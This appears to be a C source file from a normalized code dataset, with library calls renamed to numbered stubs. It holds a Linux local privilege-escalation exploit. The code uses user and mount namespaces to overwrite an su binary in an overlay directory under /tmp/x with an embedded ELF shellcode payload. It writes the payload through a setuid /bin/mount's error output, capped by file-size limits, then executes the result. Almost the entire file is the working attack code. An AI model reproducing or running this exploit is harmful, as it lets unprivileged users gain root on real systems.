#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  suidExecMinimalElf ;
struct stat {int dummy; } ;
struct rlimit {int rlim_cur; int rlim_max; } ;
typedef  int pid_t ;

/* Variables and functions */
 int CLONE_NEWNS ; 
 int CLONE_NEWUSER ; 
 int O_CREAT ; 
 int O_RDWR ; 
 int O_TRUNC ; 
 int /*<<< orphan*/  O_WRONLY ; 
 int /*<<< orphan*/  RLIMIT_AS ; 
 int /*<<< orphan*/  RLIMIT_FSIZE ; 
 int /*<<< orphan*/  SEEK_SET ; 
 int SIGCHLD ; 
 scalar_t__ STACK_SIZE ; 
 int /*<<< orphan*/  childFunc ; 
 scalar_t__ child_stack ; 
 int FUNC0 (int /*<<< orphan*/ ,scalar_t__,int,char**) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int,int) ; 
 int errno ; 
 int /*<<< orphan*/  FUNC3 (char*,char**,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 int FUNC5 () ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ,char*,...) ; 
 int FUNC7 () ; 
 int FUNC8 () ; 
 int /*<<< orphan*/  FUNC9 (int,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (char*,int) ; 
 int FUNC11 (char*,int,...) ; 
 int FUNC12 (int /*<<< orphan*/ ,struct rlimit*) ; 
 int /*<<< orphan*/  FUNC13 (char*,char*,int) ; 
 int FUNC14 (char*,struct stat*) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC15 (char*,char*) ; 
 char* FUNC16 (int) ; 
 int FUNC17 (char*) ; 
 scalar_t__ FUNC18 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC19 (int) ; 
 int /*<<< orphan*/  FUNC20 (int,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int FUNC21 (int,char*,int) ; 

int FUNC22(int argc, char *argv[]) {
  int argPos;
  int result;
  char *targetSuidPath="/bin/su";
  char *helperSuidPath="/bin/mount";

  for(argPos=1; argPos<argc; argPos++) {
    char *argName=argv[argPos];
    if(!FUNC15(argName, "--")) {
      argPos++;
      break;
    }
    if(FUNC18(argName, "--", 2)) {
      break;
    }

    FUNC6(stderr, "%s: unknown argument %s\n", argv[0], argName);
    FUNC4(1);
  }

  FUNC10("/tmp/x", 0700);
  FUNC10("/tmp/x/bin", 0700);
  FUNC10("/tmp/x/over", 0700);

// Create child; child commences execution in childFunc()
// CLONE_NEWNS: new mount namespace
// CLONE_NEWPID
// CLONE_NEWUTS
  pid_t pid=FUNC0(childFunc, child_stack+STACK_SIZE,
      CLONE_NEWUSER|CLONE_NEWNS|SIGCHLD, argv+argPos);
  if(pid==-1) {
    FUNC6(stderr, "Clone failed: %d (%s)\n", errno, FUNC16(errno));
    return(1);
  }

  char idMapFileName[128];
  char idMapData[128];

  FUNC13(idMapFileName, "/proc/%d/setgroups", pid);
  int setGroupsFd=FUNC11(idMapFileName, O_WRONLY);
  if(setGroupsFd<0) {
    FUNC6(stderr, "Failed to open setgroups\n");
    return(1);
  }
  result=FUNC21(setGroupsFd, "deny", 4);
  if(result<0) {
    FUNC6(stderr, "Failed to disable setgroups\n");
    return(1);
  }
  FUNC1(setGroupsFd);

  FUNC13(idMapFileName, "/proc/%d/uid_map", pid);
  FUNC6(stderr, "Setting uid map in %s\n", idMapFileName);
  int uidMapFd=FUNC11(idMapFileName, O_WRONLY);
  if(uidMapFd<0) {
    FUNC6(stderr, "Failed to open uid map\n");
    return(1);
  }
  FUNC13(idMapData, "0 %d 1\n", FUNC8());
  result=FUNC21(uidMapFd, idMapData, FUNC17(idMapData));
  if(result<0) {
    FUNC6(stderr, "UID map write failed: %d (%s)\n", errno, FUNC16(errno));
    return(1);
  }
  FUNC1(uidMapFd);

  FUNC13(idMapFileName, "/proc/%d/gid_map", pid);
  FUNC6(stderr, "Setting gid map in %s\n", idMapFileName);
  int gidMapFd=FUNC11(idMapFileName, O_WRONLY);
  if(gidMapFd<0) {
    FUNC6(stderr, "Failed to open gid map\n");
    return(1);
  }
  FUNC13(idMapData, "0 %d 1\n", FUNC7());
  result=FUNC21(gidMapFd, idMapData, FUNC17(idMapData));
  if(result<0) {
    FUNC6(stderr, "GID map write failed: %d (%s)\n", errno, FUNC16(errno));
    return(1);
  }
  FUNC1(gidMapFd);

// Wait until /tmp/x/over/su exists
  struct stat statBuf;
  while(1) {
    FUNC19(100);
    result=FUNC14("/tmp/x/over/su", &statBuf);
    if(!result) break;
  }

// Overwrite the file
  FUNC13(idMapFileName, "/proc/%d/cwd/su", pid);

// No slashes allowed, everything else is OK.
  char suidExecMinimalElf[] = {
      0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
      0x80, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0xf8, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x02, 0x00, 0x28, 0x00,
      0x05, 0x00, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0xa2, 0x00, 0x00, 0x00,
      0xa2, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
      0x01, 0x00, 0x00, 0x00, 0xa4, 0x00, 0x00, 0x00, 0xa4, 0x90, 0x04, 0x08,
      0xa4, 0x90, 0x04, 0x08, 0x09, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
      0x06, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xc0, 0x89, 0xc8,
      0x89, 0xd0, 0x89, 0xd8, 0x04, 0xd2, 0xcd, 0x80, 

      0x31, 0xc0, 0x04, 0xd0, 0xcd, 0x80,

      0x31, 0xc0, 0x89, 0xd0,
      0xb0, 0x0b, 0x89, 0xe1, 0x83, 0xc1, 0x08, 0x8b, 0x19, 0xcd, 0x80
  };
  char *helperArgs[]={"/bin/mount", NULL};

  int destFd=FUNC11(idMapFileName, O_RDWR|O_CREAT|O_TRUNC, 07777);
  if(destFd<0) {
    FUNC6(stderr, "Failed to open %s, error %s\n", idMapFileName, FUNC16(errno));
    return(1);
  }

  char *suidWriteNext=suidExecMinimalElf;
  char *suidWriteEnd=suidExecMinimalElf+sizeof(suidExecMinimalElf);
  while(suidWriteNext!=suidWriteEnd) {
    char *suidWriteTestPos=suidWriteNext;
    while((!*suidWriteTestPos)&&(suidWriteTestPos!=suidWriteEnd))
      suidWriteTestPos++;
// We cannot write any 0-bytes. So let seek fill up the file wihh
// null-bytes for us.
    FUNC9(destFd, suidWriteTestPos-suidExecMinimalElf, SEEK_SET);
    suidWriteNext=suidWriteTestPos;
    while((*suidWriteTestPos)&&(suidWriteTestPos!=suidWriteEnd))
      suidWriteTestPos++;

    pid_t helperPid=FUNC5();
    if(!helperPid) {
      struct rlimit limits;

// We can't truncate, that would remove the setgid property of
// the file. So make sure the SUID binary does not write too much.
      limits.rlim_cur=suidWriteTestPos-suidExecMinimalElf;
      limits.rlim_max=limits.rlim_cur;
      FUNC12(RLIMIT_FSIZE, &limits);

// Do not rely on some SUID binary to print out the unmodified
// program name, some OSes might have hardening against that.
// Let the ld-loader will do that for us.
      limits.rlim_cur=1<<22;
      limits.rlim_max=limits.rlim_cur;
      result=FUNC12(RLIMIT_AS, &limits);

      FUNC2(destFd, 1);
      FUNC2(destFd, 2);
      helperArgs[0]=suidWriteNext;
      FUNC3(helperSuidPath, helperArgs, NULL);
      FUNC6(stderr, "Exec failed\n");
      return(1);
    }
    FUNC20(helperPid, NULL, 0);
    suidWriteNext=suidWriteTestPos;
  }
  FUNC1(destFd);
  FUNC3(idMapFileName, argv+argPos-1, NULL);
  FUNC6(stderr, "Failed to execute %s: %d (%s)\n", idMapFileName,
      errno, FUNC16(errno));
  return(1);
}